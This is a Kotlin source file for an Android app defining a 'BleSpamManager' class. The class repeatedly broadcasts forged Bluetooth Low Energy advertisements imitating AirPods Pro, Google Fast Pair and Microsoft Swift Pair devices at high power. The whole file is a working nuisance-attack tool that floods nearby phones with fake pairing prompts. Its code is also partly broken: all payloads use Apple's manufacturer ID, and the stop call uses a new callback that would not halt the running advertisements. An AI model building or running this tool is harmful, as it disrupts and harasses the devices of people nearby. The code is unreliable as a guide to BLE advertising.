package com.example.bruceir

import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.os.Handler
import android.os.Looper
import android.util.Log

class BleSpamManager {

    private val bluetoothAdapter: BluetoothAdapter? = BluetoothAdapter.getDefaultAdapter()
    private var advertiser: BluetoothLeAdvertiser? = null
    private var isSpamming = false
    private val handler = Handler(Looper.getMainLooper())

    private val payloads = listOf(
        // Apple AirPods Pro
        byteArrayOf(0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA.toByte(), 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12),
        // Google Fast Pair
        byteArrayOf(0x06, 0x00, 0x00, 0x00, 0x00, 0x80.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
        // Microsoft Swift Pair
        byteArrayOf(0x01, 0x00, 0x03, 0x00, 0x80.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
    )

    fun startSpam() {
        if (isSpamming) return
        advertiser = bluetoothAdapter?.bluetoothLeAdvertiser
        if (advertiser == null) return

        isSpamming = true
        spamLoop()
    }

    private fun spamLoop() {
        if (!isSpamming) return

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setConnectable(true)
            .setTimeout(0)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .build()

        payloads.forEach { payload ->
            val data = AdvertiseData.Builder()
                .addManufacturerData(0x004C, payload) // 0x004C = Apple
                .build()

            advertiser?.startAdvertising(settings, data, object : AdvertiseCallback() {
                override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                    super.onStartSuccess(settingsInEffect)
                }
            })
        }

        handler.postDelayed({ 
            stopSpamInternal()
            spamLoop() 
        }, 1000)
    }

    fun stopSpam() {
        isSpamming = false
        stopSpamInternal()
    }

    private fun stopSpamInternal() {
        advertiser?.stopAdvertising(object : AdvertiseCallback() {})
    }
}
